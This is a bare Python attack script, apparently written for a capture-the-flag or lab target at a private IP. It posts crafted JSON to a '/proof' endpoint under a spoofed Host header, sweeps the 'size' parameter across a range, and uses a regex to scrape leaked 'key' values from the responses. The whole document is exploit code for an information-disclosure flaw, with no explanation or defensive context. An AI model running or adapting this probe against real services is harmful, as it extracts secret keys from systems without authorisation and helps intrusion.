import json
import re
import urllib.request

TARGET = "10.113.161.234"
HOST = "c4rp3d13m.net"

base = f"http://{TARGET}"


def req(size: int) -> str:
    data = json.dumps({"size": size, "proof": "wallet" * 16}).encode()
    r = urllib.request.Request(
        base + "/proof",
        data=data,
        method="POST",
        headers={"Host": HOST, "Content-Type": "application/json", "User-Agent": "ks/1.0"},
    )
    with urllib.request.urlopen(r, timeout=15) as resp:
        return resp.read().decode("latin1", "ignore")


seen = set()
for size in range(56000, 64001, 64):
    try:
        text = req(size)
    except Exception as e:
        print("ERR", size, type(e).__name__)
        continue

    m = re.search(r'"key"\s*:\s*"([^"]{10,220})"', text, re.IGNORECASE)
    if not m:
        continue
    key = m.group(1)
    if key in seen:
        continue
    seen.add(key)
    print(size, key)

print("unique keys", len(seen))
